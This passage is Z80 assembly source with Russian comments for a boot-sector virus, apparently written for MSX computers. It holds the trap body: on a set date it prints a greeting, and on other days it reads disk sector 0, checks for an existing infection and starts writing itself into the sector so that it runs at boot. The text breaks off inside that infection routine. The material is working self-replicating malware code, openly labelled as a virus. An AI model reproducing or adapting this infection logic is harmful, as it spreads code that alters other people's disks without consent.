; Собственно тело ловушки - полезная работа + размножение

HookBody:
	push	ix
	push	iy

	call	DateIn
	ld	hl,month * 256 + day
	xor	a
	sbc	hl,de
	jr	nz,neq

; Видимый эффект вируса - выдача поздравления

PutMess:
	ld	hl,(Hook+1)
Loop:
	dec	l
	ld	a,(hl)
	xor	l
LoopL:	jr	z,LoopL
	call	CHPUT
	jr	Loop

; Размножение вируса. С диска считывается 0-й сектор (незараженный),
; в его вторую половину записывается вирус и устраивается переход
; на него в момент загрузки, затем 0-й сектор пишется назад.

neq:
	ld	hl,(stDMA)		; Сохранить старое значение
	push	hl			; адреса обмена
	ld	hl,(Buffer)		; Установить адрес обмена равным
	push	hl			; адресу буфера ДОСа
	ld	(stDMA),hl
	ld	d,a			; Считать 0-й сектор
	ld	e,a
	ld	hl,(StDrive)
	ld	h,1
	call	DSKRD

	ld	bc,StEntry
	pop	hl			; Если сектор уже заражен,
	add	hl,bc			; то ничего не делать
	ld	a,(hl)
	.8080
	cpi	(push h)
	.z80
	jr	z,Return
                   			; Модифицировать сектор

	ld	de,(Hook+1)		; Сохранение старых 6 байтов
	ld	e,low Rettable		; считанного сектора
	ld	c,6			; (байты StEntry..StEntry+5)
